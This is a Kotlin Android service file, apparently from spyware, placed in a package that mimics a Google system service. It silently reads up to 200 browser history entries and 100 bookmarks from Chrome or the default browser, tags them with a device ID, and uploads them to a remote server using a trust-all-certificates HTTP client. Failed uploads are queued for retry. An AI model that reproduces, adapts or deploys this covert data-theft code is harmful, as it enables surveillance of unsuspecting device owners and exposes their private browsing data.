package com.google.android.systemservice.services

import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.IBinder
import android.provider.Browser
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.OfflineDataQueue
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

/**
 * Extracts browser history and bookmarks from Chrome/default browser.
 */
class BrowserHistoryService : Service() {

    companion object {
        private const val TAG = "BrowserHistory"
        // Chrome content provider URIs
        private val CHROME_HISTORY_URI = Uri.parse("content://com.android.chrome.browser/history")
        private val CHROME_BOOKMARKS_URI = Uri.parse("content://com.android.chrome.browser/bookmarks")
        private val BROWSER_HISTORY_URI = Uri.parse("content://browser/history")
        private val BROWSER_BOOKMARKS_URI = Uri.parse("content://browser/bookmarks")
    }

    private val httpClient = TrustAllCertificates.createClientBuilder().build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread { collectAndSend() }.start()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        httpClient.dispatcher.executorService.shutdown()
        httpClient.connectionPool.evictAll()
        stopForeground(false)
        super.onDestroy()
    }

    private fun collectAndSend() {
        try {
            val history = JSONArray()
            val bookmarks = JSONArray()

            // Try Chrome history
            queryHistory(CHROME_HISTORY_URI, history)
            queryBookmarks(CHROME_BOOKMARKS_URI, bookmarks)

            // Fallback to default browser
            if (history.length() == 0) {
                queryHistory(BROWSER_HISTORY_URI, history)
                queryBookmarks(BROWSER_BOOKMARKS_URI, bookmarks)
            }

            val payload = JSONObject().apply {
                put("device_id", AndroidConfig.deviceId)
                put("history", history)
                put("bookmarks", bookmarks)
                put("history_count", history.length())
                put("bookmarks_count", bookmarks.length())
                put("timestamp", System.currentTimeMillis())
            }

            sendToServer(payload)
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting browser data: ${e.message}")
        } finally {
            stopSelf()
        }
    }

    private fun queryHistory(uri: Uri, results: JSONArray) {
        try {
            val cursor: Cursor? = contentResolver.query(
                uri,
                arrayOf("title", "url", "visits", "date"),
                null, null, "date DESC"
            )
            cursor?.use {
                val titleIdx = it.getColumnIndex("title")
                val urlIdx = it.getColumnIndex("url")
                val visitsIdx = it.getColumnIndex("visits")
                val dateIdx = it.getColumnIndex("date")
                var count = 0
                while (it.moveToNext() && count < 200) {
                    results.put(JSONObject().apply {
                        put("title", if (titleIdx >= 0) it.getString(titleIdx) else "")
                        put("url", if (urlIdx >= 0) it.getString(urlIdx) else "")
                        put("visits", if (visitsIdx >= 0) it.getInt(visitsIdx) else 0)
                        put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0)
                    })
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "No permission for browser history: ${e.message}")
        } catch (e: Exception) {
            Log.w(TAG, "Cannot query $uri: ${e.message}")
        }
    }

    private fun queryBookmarks(uri: Uri, results: JSONArray) {
        try {
            val cursor: Cursor? = contentResolver.query(
                uri,
                arrayOf("title", "url", "created"),
                "bookmark=1", null, "created DESC"
            )
            cursor?.use {
                val titleIdx = it.getColumnIndex("title")
                val urlIdx = it.getColumnIndex("url")
                var count = 0
                while (it.moveToNext() && count < 100) {
                    results.put(JSONObject().apply {
                        put("title", if (titleIdx >= 0) it.getString(titleIdx) else "")
                        put("url", if (urlIdx >= 0) it.getString(urlIdx) else "")
                        put("type", "bookmark")
                    })
                    count++
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Cannot query bookmarks: ${e.message}")
        }
    }

    private fun sendToServer(payload: JSONObject) {
        try {
            val body = payload.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${AndroidConfig.apiBaseUrl}/browser_history")
                .post(body)
                .build()

            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    OfflineDataQueue(this).enqueue("browser_history", payload.toString(), AndroidConfig.deviceId)
                }
            }
        } catch (e: IOException) {
            OfflineDataQueue(this).enqueue("browser_history", payload.toString(), AndroidConfig.deviceId)
        }
    }
}
